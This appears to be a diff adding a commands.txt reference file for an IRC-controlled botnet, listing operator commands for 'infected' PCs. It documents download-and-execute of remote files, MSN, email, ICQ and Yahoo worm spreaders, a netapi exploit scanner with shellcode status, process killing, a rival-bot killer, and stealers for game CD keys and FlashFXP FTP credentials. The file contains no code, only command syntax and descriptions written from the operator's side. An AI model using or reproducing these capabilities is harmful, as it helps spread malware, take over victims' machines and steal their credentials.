@@ -1,0 +1,105 @@
+->BOTBOT::Commands&Information
+
+
+/* Fake command donot use if its your net!*/
+.BOT!.login
+Will say its logged in when its not.
+Will hang the bot on delay mode for 1 minute.
+Warning
+*/
+
+/* Bot Main Commands */
+
+.BOT!.sysinfo                      || System Information
+.BOT!.disconnect                   || bot disconnects
+.BOT!.reconnect                    || Bot reconnects
+.BOT!.raw                          || raw commands
+.BOT!.remove                       || Bye bye
+.BOT!.raw                          || raw commands
+.BOT!.remove                       || Bye bye
+
+/* Bot Main Commands */
+
+
+/* Download system */
+
+.BOT!.download                     || url dest -u or -e : Example .BOT!.download http://google.com c:\test.php -u will update -d will just download -e will execute the downloaded file.
+
+/* Download system */
+
+
+/* worm shit */
+
+.BOT!.msnstart                     || Starts the msn worm version 2
+.BOT!.mailstart                    || start's the e-mail spreader
+.BOT!.mailstop                     || stop's the e-mail spreader
+.BOT!.icqstart
+.BOT!.yahoostart
+
+/* worm shit */
+
+
+
+/* Honeypot */
+
+.BOT!.honeypot                    || Not finished all it does atm is listen on ports exploits use to connect to to expl: Waits for incoming data and prints it to channel
+
+
+/* Honeypot */
+
+
+/* Bot Killer(Mem scan) */
+
+.BOT!.killstart                    || Start's the bot killer (search defined strings in mem then move file kill it then uploads for your usage)
+
+/* Bot Killer(Mem scan) */
+
+/* BlowFIsh test */
+
+.BOT!.blowtest
+
+/* BlowFIsh test */
+
+
+/* Bot Scanner */
+
+.BOT!.start netapi -s 0 -r 100 5   || Example
+.BOT!.infected                     || Basic scanstats
+.BOT!.stop                         || stops scanning
+.BOT!.current                      || Gets current scann information
+.BOT!.status      
+                 || Gets shellcode status information VERY USEFULL And needed never remove
+/* Bot Scanner */
+
+/* User[INFECTED] PC Commands */
+
+.BOT!.proclist                     || gets the process list.
+.BOT!.prockill                     || kill's a process.
+
+/* User[INFECTED] PC Commands */
+
+/* Thread system */
+
+.BOT!.threads                      || list thread's
+
+/* KIll thread not added yet */
+
+/* DAemons */
+
+.BOT!.httpstart                    || http server 
+
+/* DAemons */
+
+
+/* Stealers */
+
+.BOT!.cdkey                        || gets cd keys of my favourite game's :)
+.BOT!.flashfxp                     || FlashFXP FTP Password/User/Site etc. Retreiver
+.BOT!.parse                        || Parses the FlashFXP Information correctly
+
+/* Stealers */
+
+
+
+:- /End of commands.txt
+
